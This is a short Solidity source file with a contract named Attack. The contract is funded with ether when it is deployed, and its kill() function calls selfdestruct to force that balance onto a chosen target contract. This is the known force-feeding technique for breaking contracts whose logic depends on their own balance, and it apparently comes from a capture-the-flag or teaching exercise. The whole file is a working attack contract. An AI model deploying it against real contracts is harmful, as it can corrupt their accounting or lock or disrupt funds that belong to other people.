// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    address payable target;

    constructor(address targetAddr) payable { // send ethers to the contract when deploying it
        target = payable(targetAddr);
    }

    function kill() public {
        selfdestruct(target);
    }
}
